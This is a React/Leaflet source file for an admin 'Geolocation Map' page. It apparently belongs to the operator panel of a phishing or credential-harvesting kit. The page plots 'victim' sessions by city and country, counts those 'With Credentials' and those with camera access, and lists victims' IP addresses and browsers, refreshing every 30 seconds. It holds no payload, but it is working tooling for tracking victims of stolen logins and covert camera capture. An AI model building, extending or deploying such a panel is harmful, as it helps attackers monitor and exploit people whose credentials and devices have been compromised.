import React, { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { Box, Typography, Card, CardContent, Chip, IconButton, Tooltip, Avatar, AvatarGroup, Paper, Divider, List, ListItem, ListItemAvatar, ListItemText, Badge, CircularProgress } from '@mui/material';
import { MapContainer, TileLayer, Marker, Popup, CircleMarker, Polyline } from 'react-leaflet';
import L from 'leaflet';
import axios from 'axios';
import MyLocationIcon from '@mui/icons-material/MyLocation';
import PeopleIcon from '@mui/icons-material/People';
import PublicIcon from '@mui/icons-material/Public';
import TravelExploreIcon from '@mui/icons-material/TravelExplore';
import RefreshIcon from '@mui/icons-material/Refresh';
import OpenInNewIcon from '@mui/icons-material/OpenInNew';

delete L.Icon.Default.prototype._getIconUrl;
L.Icon.Default.mergeOptions({
  iconRetinaUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-icon-2x.png',
  iconUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-icon.png',
  shadowUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-shadow.png'
});

// Custom colored marker icons
const createMarkerIcon = (color) => {
  return L.divIcon({
    className: 'custom-marker',
    html: `<div style="
      width: 24px; height: 24px; border-radius: 50%;
      background: ${color}; border: 3px solid #fff;
      box-shadow: 0 0 12px ${color}80, 0 2px 8px rgba(0,0,0,0.4);
      display: flex; align-items: center; justify-content: center;
      font-size: 10px; color: #fff; font-weight: bold;
    "></div>`,
    iconSize: [24, 24],
    iconAnchor: [12, 12],
    popupAnchor: [0, -16]
  });
};

const FLAG_EMOJI = {
  'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺',
  'DE': '🇩🇪', 'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸',
  'BR': '🇧🇷', 'IN': '🇮🇳', 'CN': '🇨🇳', 'JP': '🇯🇵',
  'RU': '🇷🇺', 'KR': '🇰🇷', 'NL': '🇳🇱', 'SE': '🇸🇪',
  'NO': '🇳🇴', 'FI': '🇫🇮', 'DK': '🇩🇰', 'PL': '🇵🇱',
  'TR': '🇹🇷', 'ZA': '🇿🇦', 'MX': '🇲🇽', 'AR': '🇦🇷',
  'IL': '🇮🇱', 'AE': '🇦🇪', 'SG': '🇸🇬', 'HK': '🇭🇰',
  'TW': '🇹🇼', 'TH': '🇹🇭', 'VN': '🇻🇳', 'ID': '🇮🇩',
  'MY': '🇲🇾', 'PH': '🇵🇭', 'NZ': '🇳🇿', 'PK': '🇵🇰',
  'BD': '🇧🇩', 'NG': '🇳🇬', 'EG': '🇪🇬', 'KE': '🇰🇪'
};

const getFlag = (country) => {
  if (!country) return '🌍';
  const code = country.substring(0, 2).toUpperCase();
  const emoji = FLAG_EMOJI[code];
  if (emoji) return emoji;
  // Return a generic globe if not found
  return '🌐';
};

export default function MapView() {
  const [locations, setLocations] = useState([]);
  const [stats, setStats] = useState({ totalLocations: 0, totalSessions: 0, uniqueCountries: 0, withCredentials: 0 });
  const [loading, setLoading] = useState(true);
  const [selectedLocation, setSelectedLocation] = useState(null);
  const [heatmapMode, setHeatmapMode] = useState(false);
  const navigate = useNavigate();
  const mapRef = useRef(null);

  const fetchLocations = async () => {
    try {
      setLoading(true);
      const res = await axios.get('/api/admin/geolocation-map');
      const data = res.data || [];
      setLocations(data);

      if (Array.isArray(data) && data.length > 0) {
        // Compute stats - handle both 'count' and other possible field names
        const countries = new Set(data.map(l => l._id?.country).filter(Boolean));
        const credCount = data.reduce((sum, loc) => {
          const sessions = loc.sessions || [];
          const hasCreds = sessions.filter(s => s && s.hasCredentials).length;
          return sum + hasCreds;
        }, 0);
        const totalSessions = data.reduce((sum, loc) => sum + (loc.count || loc.sessionCount || 0), 0);

        setStats({
          totalLocations: data.length,
          totalSessions,
          uniqueCountries: countries.size,
          withCredentials: credCount
        });
      } else {
        // Fallback if API returns empty but connected
        setStats(prev => ({ ...prev, totalLocations: 0 }));
      }
    } catch (e) {
      console.error('Map data fetch error:', e);
    } finally {
      setLoading(false);
    }
  };
  /**
   * Also fetch stats from the dashboard API as a backup source
   * Uses ref to avoid stale closure with stats state
   */
  const fetchBackupStats = async () => {
    try {
      const token = localStorage.getItem('admin_token');
      const res = await axios.get('/api/admin/stats', { headers: { Authorization: `Bearer ${token}` } });
      if (res.data) {
        setStats(prev => {
          // Only use backup stats if map data came back empty or has less data
          const newSessions = res.data.totalSessions || 0;
          const newCredentials = res.data.totalCredentials || 0;
          const newOnline = res.data.sessions24h || 0;
          if (prev.totalSessions === 0 && newSessions > 0) {
            return { ...prev, totalSessions: newSessions };
          }
          if (prev.totalSessions > 0 && newSessions > prev.totalSessions && !res.data.fromMap) {
            // Dashboard has more complete data - merge
            return { ...prev, totalSessions: Math.max(prev.totalSessions, newSessions) };
          }
          return prev;
        });
      }
    } catch (e) {
      // Silent fail
    }
  };
  useEffect(() => {
    fetchLocations();
    fetchBackupStats();
    const interval = setInterval(fetchLocations, 30000);
    return () => clearInterval(interval);
  }, []);

  // Get connection lines between locations for visual effect
  const connectionLines = [];
  if (locations.length > 1) {
    for (let i = 0; i < Math.min(locations.length, 8); i++) {
      for (let j = i + 1; j < Math.min(locations.length, 8); j++) {
        const loc1 = locations[i];
        const loc2 = locations[j];
        if (loc1._id?.lat && loc1._id?.lon && loc2._id?.lat && loc2._id?.lon) {
          connectionLines.push({
            from: [loc1._id.lat, loc1._id.lon],
            to: [loc2._id.lat, loc2._id.lon],
            weight: Math.min(loc1.count + loc2.count, 15)
          });
        }
      }
    }
  }

  return (
    <Box>
      {/* Header */}
      <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 2, flexWrap: 'wrap', gap: 1 }}>
        <Box>
          <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5 }}>
            <PublicIcon sx={{ color: '#00f0ff', fontSize: 28 }} />
            <Typography variant="h4" sx={{ color: '#fff', fontWeight: 700, fontSize: '1.4rem' }}>
              Geolocation Map
            </Typography>
            <Chip
              icon={<TravelExploreIcon sx={{ fontSize: 14 }} />}
              label={`${stats.totalSessions} sessions mapped`}
              size="small"
              sx={{ bgcolor: 'rgba(0,240,255,0.08)', color: '#00f0ff', fontWeight: 600, height: 24 }}
            />
          </Box>
          <Typography sx={{ color: '#888', fontSize: '0.85rem', mt: 0.2 }}>
            Real-time victim geolocation · Auto-updates every 30s
          </Typography>
        </Box>

        <Box sx={{ display: 'flex', gap: 1, alignItems: 'center' }}>
          <Tooltip title="Refresh data">
            <IconButton size="small" onClick={fetchLocations} sx={{ color: '#00f0ff' }}>
              <RefreshIcon />
            </IconButton>
          </Tooltip>
        </Box>
      </Box>

      {/* Stats Bar */}
      <Paper sx={{
        display: 'flex', alignItems: 'center', gap: 1, p: 2, mb: 2,
        bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.05)',
        borderRadius: 2, flexWrap: 'wrap'
      }}>
        <Box sx={{ textAlign: 'center', flex: 1, minWidth: 80 }}>
          <Typography sx={{ color: '#00f0ff', fontSize: '1.5rem', fontWeight: 700 }}>
            {stats.uniqueCountries}
          </Typography>
          <Typography sx={{ color: '#888', fontSize: '0.7rem' }}>Countries</Typography>
        </Box>
        <Box sx={{ width: '1px', height: 40, bgcolor: 'rgba(255,255,255,0.08)', flexShrink: 0 }} />
        <Box sx={{ textAlign: 'center', flex: 1, minWidth: 80 }}>
          <Typography sx={{ color: '#fff', fontSize: '1.5rem', fontWeight: 700 }}>
            {stats.totalLocations}
          </Typography>
          <Typography sx={{ color: '#888', fontSize: '0.7rem' }}>Cities</Typography>
        </Box>
        <Box sx={{ width: '1px', height: 40, bgcolor: 'rgba(255,255,255,0.08)', flexShrink: 0 }} />
        <Box sx={{ textAlign: 'center', flex: 1, minWidth: 80 }}>
          <Typography sx={{ color: '#fff', fontSize: '1.5rem', fontWeight: 700 }}>
            {stats.totalSessions}
          </Typography>
          <Typography sx={{ color: '#888', fontSize: '0.7rem' }}>Sessions</Typography>
        </Box>
        <Box sx={{ width: '1px', height: 40, bgcolor: 'rgba(255,255,255,0.08)', flexShrink: 0 }} />
        <Box sx={{ textAlign: 'center', flex: 1, minWidth: 80 }}>
          <Typography sx={{ color: '#ff0055', fontSize: '1.5rem', fontWeight: 700 }}>
            {stats.withCredentials}
          </Typography>
          <Typography sx={{ color: '#888', fontSize: '0.7rem' }}>With Credentials</Typography>
        </Box>
      </Paper>

      <Box sx={{ display: 'flex', gap: 2, flexDirection: { xs: 'column', md: 'row' } }}>
        {/* Map */}
        <Card sx={{
          flex: 1,
          bgcolor: '#0d1117',
          border: '1px solid rgba(255,255,255,0.05)',
          height: { xs: '50vh', md: '68vh' },
          borderRadius: 2,
          overflow: 'hidden',
          position: 'relative'
        }}>
          {loading && (
            <Box sx={{ position: 'absolute', top: 12, right: 12, zIndex: 1000 }}>
              <CircularProgress size={20} sx={{ color: '#00f0ff' }} />
            </Box>
          )}
          <CardContent sx={{ p: 0, height: '100%' }}>
            <MapContainer
              center={[20, 0]}
              zoom={2}
              style={{ height: '100%', width: '100%' }}
              ref={mapRef}
            >
              <TileLayer
                url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png"
                attribution='&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
              />

              {/* Connection lines between top locations */}
              {connectionLines.map((line, i) => (
                <Polyline
                  key={`line-${i}`}
                  positions={[line.from, line.to]}
                  pathOptions={{
                    color: 'rgba(0, 240, 255, 0.08)',
                    weight: Math.min(line.weight * 0.3, 3),
                    dashArray: '5, 10',
                    opacity: 0.3
                  }}
                />
              ))}

              {/* Cluster markers */}
              {locations.map((loc, i) => {
                if (!loc._id?.lat || !loc._id?.lon) return null;
                const hasCreds = loc.sessions?.some(s => s.hasCredentials);
                const color = hasCreds ? '#ff0055' : '#00f0ff';
                const radius = Math.min(loc.count * 3 + 5, 35);
                const opacity = Math.min(0.2 + (loc.count / Math.max(...locations.map(l => l.count || 1))) * 0.4, 0.6);

                return (
                  <React.Fragment key={`loc-${i}`}>
                    {/* Glow ring */}
                    <CircleMarker
                      center={[loc._id.lat, loc._id.lon]}
                      radius={radius + 8}
                      pathOptions={{
                        color: 'transparent',
                        fillColor: hasCreds ? '#ff0055' : '#00f0ff',
                        fillOpacity: 0.05
                      }}
                    />
                    {/* Main marker */}
                    <CircleMarker
                      center={[loc._id.lat, loc._id.lon]}
                      radius={radius}
                      pathOptions={{
                        color: color,
                        fillColor: color,
                        fillOpacity: opacity,
                        weight: 2
                      }}
                    >
                      <Popup>
                        <Box sx={{
                          minWidth: 220, maxWidth: 300,
                          fontFamily: 'system-ui, sans-serif'
                        }}>
                          {/* Location header */}
                          <Box sx={{
                            display: 'flex', alignItems: 'center', gap: 1, mb: 1,
                            borderBottom: '1px solid rgba(0,0,0,0.08)', pb: 1
                          }}>
                            <Typography variant="subtitle1" sx={{ fontWeight: 700, fontSize: '0.95rem' }}>
                              {getFlag(loc._id.country)} {loc._id.city || 'Unknown City'}
                            </Typography>
                            <Chip
                              label={loc._id.country || 'Unknown'}
                              size="small"
                              sx={{ height: 18, fontSize: '0.6rem', bgcolor: 'rgba(0,0,0,0.06)' }}
                            />
                          </Box>

                          {/* Stats */}
                          <Box sx={{ display: 'flex', gap: 2, mb: 1 }}>
                            <Box>
                              <Typography variant="caption" sx={{ color: '#666', fontSize: '0.65rem' }}>Sessions</Typography>
                              <Typography sx={{ fontWeight: 700, fontSize: '1.1rem' }}>{loc.count}</Typography>
                            </Box>
                            <Box>
                              <Typography variant="caption" sx={{ color: '#666', fontSize: '0.65rem' }}>Credentials</Typography>
                              <Typography sx={{ fontWeight: 700, fontSize: '1.1rem', color: '#ff0055' }}>
                                {loc.sessions?.filter(s => s.hasCredentials).length || 0}
                              </Typography>
                            </Box>
                            <Box>
                              <Typography variant="caption" sx={{ color: '#666', fontSize: '0.65rem' }}>Camera</Typography>
                              <Typography sx={{ fontWeight: 700, fontSize: '1.1rem', color: '#ffaa00' }}>
                                {loc.sessions?.filter(s => s.cameraAccess).length || 0}
                              </Typography>
                            </Box>
                          </Box>

                          {/* Session list */}
                          <Typography variant="caption" sx={{ color: '#888', fontSize: '0.65rem', display: 'block', mb: 0.5 }}>
                            Recent sessions:
                          </Typography>
                          {loc.sessions?.slice(0, 6).map((s, j) => (
                            <Chip
                              key={j}
                              label={`${s.browser || '?'} · ${(s.ip || '').substring(0, 12)}`}
                              size="small"
                              onClick={() => navigate(`/admin/sessions/${s.id}`)}
                              sx={{
                                mt: 0.3, mr: 0.3, cursor: 'pointer',
                                bgcolor: s.hasCredentials ? 'rgba(255,0,85,0.12)' : 'rgba(0,240,255,0.08)',
                                color: s.hasCredentials ? '#ff0055' : '#00f0ff',
                                fontSize: '0.6rem', height: 18,
                                '&:hover': { bgcolor: s.hasCredentials ? 'rgba(255,0,85,0.25)' : 'rgba(0,240,255,0.2)' }
                              }}
                            />
                          ))}
                          {loc.sessions?.length > 6 && (
                            <Typography sx={{ color: '#999', fontSize: '0.6rem', mt: 0.3 }}>
                              +{loc.sessions.length - 6} more sessions
                            </Typography>
                          )}
                        </Box>
                      </Popup>
                    </CircleMarker>
                  </React.Fragment>
                );
              })}
            </MapContainer>
          </CardContent>
        </Card>

        {/* Sidebar - Recent Locations List */}
        <Paper sx={{
          width: { xs: '100%', md: 280 },
          bgcolor: '#0d1117',
          border: '1px solid rgba(255,255,255,0.05)',
          borderRadius: 2,
          maxHeight: '68vh',
          overflow: 'auto',
          flexShrink: 0
        }}>
          <Box sx={{ p: 1.5, borderBottom: '1px solid rgba(255,255,255,0.05)' }}>
            <Typography sx={{ color: '#fff', fontWeight: 600, fontSize: '0.85rem', display: 'flex', alignItems: 'center', gap: 0.5 }}>
              <MyLocationIcon sx={{ fontSize: 16, color: '#00f0ff' }} />
              All Locations
            </Typography>
          </Box>
          <List dense sx={{ py: 0 }}>
            {locations.slice(0, 30).map((loc, i) => {
              const hasCreds = loc.sessions?.some(s => s.hasCredentials);
              return (
                <ListItem
                  key={i}
                  sx={{
                    py: 1, px: 1.5,
                    borderBottom: '1px solid rgba(255,255,255,0.03)',
                    cursor: 'pointer',
                    '&:hover': { bgcolor: 'rgba(255,255,255,0.03)' },
                    bgcolor: selectedLocation === i ? 'rgba(0,240,255,0.05)' : 'transparent'
                  }}
                  onClick={() => {
                    setSelectedLocation(i);
                    navigate(`/admin/sessions?country=${encodeURIComponent(loc._id?.country || '')}`);
                  }}
                >
                  <ListItemAvatar sx={{ minWidth: 36 }}>
                    <Avatar sx={{ width: 28, height: 28, bgcolor: hasCreds ? 'rgba(255,0,85,0.15)' : 'rgba(0,240,255,0.1)', fontSize: '0.8rem' }}>
                      {getFlag(loc._id?.country)}
                    </Avatar>
                  </ListItemAvatar>
                  <ListItemText
                    primary={
                      <Typography sx={{ color: '#ddd', fontSize: '0.78rem', fontWeight: 500 }}>
                        {loc._id?.city || 'Unknown City'}
                        {loc._id?.country ? `, ${loc._id.country}` : ''}
                      </Typography>
                    }
                    secondary={
                      <Box sx={{ display: 'flex', gap: 0.5, mt: 0.3 }}>
                        <Chip label={`${loc.count} sessions`} size="small" sx={{ height: 16, fontSize: '0.55rem', bgcolor: 'rgba(0,240,255,0.08)', color: '#00f0ff' }} />
                        {hasCreds && (
                          <Chip label="🔑" size="small" sx={{ height: 16, fontSize: '0.55rem', bgcolor: 'rgba(255,0,85,0.1)', color: '#ff0055' }} />
                        )}
                        {loc.sessions?.some(s => s.cameraAccess) && (
                          <Chip label="📷" size="small" sx={{ height: 16, fontSize: '0.55rem', bgcolor: 'rgba(255,170,0,0.1)', color: '#ffaa00' }} />
                        )}
                      </Box>
                    }
                    sx={{ m: 0 }}
                  />
                  <IconButton size="small" sx={{ color: '#555', '&:hover': { color: '#00f0ff' } }}>
                    <OpenInNewIcon sx={{ fontSize: 14 }} />
                  </IconButton>
                </ListItem>
              );
            })}
          </List>
          {locations.length === 0 && !loading && (
            <Box sx={{ textAlign: 'center', py: 4 }}>
              <Typography sx={{ fontSize: '2.5rem', mb: 1, opacity: 0.3 }}>🗺️</Typography>
              <Typography sx={{ color: '#666', fontSize: '0.85rem' }}>No geolocation data yet</Typography>
              <Typography sx={{ color: '#555', fontSize: '0.75rem', mt: 0.5 }}>
                Sessions will appear here as victims visit
              </Typography>
            </Box>
          )}
          {loading && locations.length === 0 && (
            <Box sx={{ textAlign: 'center', py: 6 }}>
              <CircularProgress size={30} sx={{ color: '#00f0ff' }} />
              <Typography sx={{ color: '#666', mt: 1, fontSize: '0.85rem' }}>Loading map data...</Typography>
            </Box>
          )}
        </Paper>
      </Box>
    </Box>
  );
}